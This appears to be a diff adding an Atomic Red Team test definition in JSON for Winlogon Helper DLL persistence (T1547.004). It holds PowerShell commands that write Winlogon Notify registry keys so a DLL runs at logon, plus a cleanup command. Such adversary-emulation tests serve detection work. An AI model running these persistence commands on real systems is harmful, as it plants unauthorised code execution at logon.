@@ -1,0 +1,36 @@
+{
+    "name": "Winlogon Notify Key Logon Persistence - PowerShell",
+    "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.  Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.  Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n",
+        "cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1547.004",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Winlogon Helper DLL",
+    "source": "ART",
+    "uuid": "d40da266-e073-4e5a-bb8b-2b385023e5f9",
+    "arguments": {
+        "binary_to_execute": {
+            "description": "Path of notification package to execute",
+            "type": "path",
+            "default": "C:\\Windows\\Temp\\atomicNotificationPackage.dll"
+        },
+        "function_to_execute": {
+            "description": "Function in notification package to execute",
+            "type": "string",
+            "default": "AtomicTestFunction"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
